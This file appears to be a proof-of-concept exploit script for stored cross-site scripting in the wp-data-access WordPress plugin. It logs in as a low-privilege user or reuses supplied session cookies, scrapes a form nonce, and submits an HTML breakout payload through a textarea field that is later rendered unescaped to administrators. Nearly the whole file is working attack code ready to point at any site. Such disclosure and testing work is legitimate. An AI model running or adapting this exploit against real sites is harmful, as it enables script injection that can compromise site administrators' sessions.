#!/usr/bin/env python3
"""
PoC for Stored XSS via TEXT column (textarea).

Root cause:
  - WPDA_Simple_Form.php:518 stores wp_unslash($_REQUEST[col]) without sanitization.
  - WPDA_Simple_Form_Data.php:149,158 insert() / :352-354 update() store raw.
  - WPDA_Simple_Form_Item.php:478 only replaces '&' -> '&amp;'.
  - WPDA_Simple_Form_Item_Textarea.php:22 echoes raw inside <textarea>.

Usage (attacker):
  python3 poc.py --url="http://localhost/wordpress/my-data-page/"
  python3 poc.py --url="http://localhost/wordpress/my-data-page/" --username subscriber --password 'p@ss'
  python3 poc.py --url="http://localhost/wordpress/my-data-page/" --cookies "wordpress_logged_in_xxx=..."

The script:
  1. GETs --url (optionally logs in first).
  2. Follows/loads the "New row" form (?action=new).
  3. Parses first <textarea name=...> + _wpnonce.
  4. POSTs payload </textarea><svg onload=alert(document.domain)>.
  5. Checks POST response for raw breakout (VULNERABLE) vs &lt; escaped (PATCHED).
Stdlib only.
"""
import argparse
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request


DEFAULT_PAYLOAD = "</textarea><svg onload=alert(document.domain)>"
UA = {"User-Agent": "Mozilla/5.0 (wpda-poc)"}


def build_opener():
    cj = http.cookiejar.CookieJar()
    ctx = ssl._create_unverified_context()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx),
    )
    opener.cj = cj
    return opener


def http_get(opener, url, timeout=20):
    req = urllib.request.Request(url, headers=UA)
    with opener.open(req, timeout=timeout) as r:
        return r.url, r.read().decode("utf-8", "ignore")


def http_post(opener, url, data, timeout=20):
    body = urllib.parse.urlencode(data, doseq=True).encode()
    req = urllib.request.Request(url, data=body, headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
    with opener.open(req, timeout=timeout) as r:
        return r.url, r.read().decode("utf-8", "ignore")


def wp_candidates(target):
    p = urllib.parse.urlparse(target)
    root = f"{p.scheme}://{p.netloc}"
    parts = [x for x in p.path.split("/") if x]
    cands = []
    # try longest prefix first: /wordpress, then /
    for i in range(len(parts), -1, -1):
        prefix = "/" + "/".join(parts[:i]) if i else ""
        cands.append((root + prefix).rstrip("/") or root)
    # dedupe preserving order
    seen, out = set(), []
    for c in cands:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def wp_login(opener, bases, username, password):
    if isinstance(bases, str):
        bases = [bases]
    last_err = None
    for base in bases:
        login_url = base.rstrip("/") + "/wp-login.php"
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": base.rstrip("/") + "/wp-admin/",
            "testcookie": "1",
        }
        try:
            _, body = http_post(opener, login_url, data)
        except Exception as e:
            last_err = e
            print(f"[!] login {login_url} failed: {e}", file=sys.stderr)
            continue
        for c in opener.cj:
            if "wordpress_logged_in" in c.name:
                print(f"[*] wp-base detected: {base}")
                return True
        if "ERROR" in body and "log in" in body.lower():
            print(f"[!] login {login_url}: bad credentials", file=sys.stderr)
            return False
    if last_err:
        print(f"[!] login request failed: {last_err}", file=sys.stderr)
    return any("wordpress_logged_in" in c.name for c in opener.cj)


def add_cookies(opener, base, cookie_str):
    parsed = urllib.parse.urlparse(base)
    # Minimal cookie injection via Cookie header handled per-request is complex with
    # CookieJar; instead store as header override in opener is not persistent.
    # Workaround: create dummy cookies in jar.
    for part in cookie_str.split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        name, value = part.split("=", 1)
        # Build a cookie manually
        from http.cookiejar import Cookie
        ck = Cookie(
            version=0, name=name.strip(), value=value.strip(),
            port=None, port_specified=False,
            domain=parsed.hostname or "", domain_specified=True, domain_initial_dot=False,
            path="/", path_specified=True,
            secure=False, expires=None, discard=True,
            comment=None, comment_url=None, rest={},
        )
        opener.cj.set_cookie(ck)


def find_textareas(html):
    return re.findall(r'<textarea[^>]*\sname=["\']([^"\']+)["\']', html, re.I)


def find_nonce(html):
    m = re.search(r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'value=["\']([^"\']+)["\'][^>]*name=["\']_wpnonce["\']', html, re.I)
    return m.group(1) if m else None


def main():
    ap = argparse.ArgumentParser(description="wp-data-access 5.5.90 textarea Stored XSS PoC")
    ap.add_argument("--url", required=True, help="URL of post/page with [wpdadiehard project_id=.. page_id=..]")
    ap.add_argument("--username", default=None, help="low-priv username (subscriber/customer) with insert access")
    ap.add_argument("--password", default=None, help="password for --username")
    ap.add_argument("--cookies", default=None, help='raw Cookie header, e.g. "wordpress_logged_in_x=...;"')
    ap.add_argument("--field", default=None, help="textarea column name (auto-detect first if omitted)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload")
    ap.add_argument("--timeout", type=int, default=20)
    ap.add_argument("--wp-base", default=None, help="WP root, e.g. http://localhost:8851/wordpress (auto-detected)")
    args = ap.parse_args()

    target = args.url
    parsed = urllib.parse.urlparse(target)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    bases = [args.wp_base.rstrip("/")] if args.wp_base else wp_candidates(target)
    opener = build_opener()

    if args.cookies:
        add_cookies(opener, bases[0], args.cookies)

    if args.username and args.password:
        ok = wp_login(opener, bases, args.username, args.password)
        print(f"[*] wp-login as {args.username}: {'OK' if ok else 'FAILED (continuing with current cookies)'}")
        if not ok and not args.cookies:
            print("[!] hint: check username/password or pass --cookies from a logged-in browser", file=sys.stderr)

    try:
        final_url, html = http_get(opener, target, args.timeout)
    except Exception as e:
        print(f"[!] GET {target} failed: {e}", file=sys.stderr)
        return 2
    print(f"[*] GET {final_url} ({len(html)} bytes)")

    # Try to load the "new row" form. List view reads action from $_REQUEST.
    new_url = target + ("&" if "?" in target else "?") + "action=new"
    try:
        n_url, n_html = http_get(opener, new_url, args.timeout)
        # Use new-form HTML only if it looks like a data-entry form
        if "_wpnonce" in n_html and ("<textarea" in n_html.lower() or "action2" in n_html):
            print(f"[*] loaded new-row form: {n_url}")
            form_url, form_html = n_url, n_html
        else:
            form_url, form_html = final_url, html
    except Exception as e:
        print(f"[!] GET {new_url} failed ({e}), using original page", file=sys.stderr)
        form_url, form_html = final_url, html

    textareas = find_textareas(form_html)
    nonce = find_nonce(form_html)
    print(f"[*] textarea fields: {textareas if textareas else 'NONE'}")
    print(f"[*] _wpnonce: {'found' if nonce else 'MISSING'}")

    if not textareas:
        print("[!] no <textarea> found. Precondition: table needs a TEXT-family column (tinytext/text/mediumtext/longtext).", file=sys.stderr)
        print("    As admin: add a TEXT column to the Data Project table and retry.", file=sys.stderr)
        low = form_html.lower()
        for needle in ["no access", "missing role", "could not determine", "wpdadiehard", "action=new", "add new", "<input", "login"]:
            if needle in low:
                # print first matching snippet
                i = low.find(needle)
                print(f"    ...{form_html[max(0,i-80):i+160].replace(chr(10),' ')[:240]}...", file=sys.stderr)
                break
        # list input names for debugging
        inputs = sorted(set(re.findall(r'name=["\']([^"\']+)["\']', form_html, re.I)))[:20]
        print(f"    [debug] input names seen: {inputs}", file=sys.stderr)
        return 2
    if not nonce:
        print("[!] no _wpnonce found. Likely causes: not logged in, wrong page_role, or allow_insert=off.", file=sys.stderr)
        return 2

    field = args.field or textareas[0]
    if field not in textareas:
        print(f"[!] --field={field} not in {textareas}", file=sys.stderr)
        return 2
    print(f"[*] injecting field={field} payload={args.payload!r}")

    post_data = {
        "action": "new",
        "action2": "save",
        "_wpnonce": nonce,
        field: args.payload,
        "postaction": "",
    }
    try:
        p_url, p_body = http_post(opener, form_url, post_data, args.timeout)
    except Exception as e:
        print(f"[!] POST save failed: {e}", file=sys.stderr)
        return 2
    print(f"[*] POST {p_url} ({len(p_body)} bytes)")

    if "Not authorized" in p_body or "Action not allowed" in p_body or "No access" in p_body:
        print("[!] server refused: role/nonce not accepted. Check page_role includes your user and allow_insert is on.", file=sys.stderr)
        return 2

    # Stored value is re-rendered in edit form after successful insert (prepare_form changes
    # action to edit and shows row from DB), so raw payload in POST response = stored XSS.
    raw_hit = args.payload in p_body
    escaped = args.payload.replace("<", "&lt;") in p_body or "&lt;/textarea&gt;" in p_body
    print(f"[*] raw payload reflected: {raw_hit}, escaped variant present: {escaped}")

    if raw_hit:
        print("[VULNERABLE] payload stored and rendered RAW inside <textarea> (breakout possible).")
        print("Next: as admin/victim open the row Edit/View -> <svg onload> executes.")
        return 0
    if escaped:
        print("[PATCHED/NOT-VULNERABLE] payload is HTML-escaped (&lt;...).")
        return 1
    print("[INCONCLUSIVE] payload not reflected. Row may need manual check in Edit/View list.", file=sys.stderr)
    return 3


if __name__ == "__main__":
    sys.exit(main())
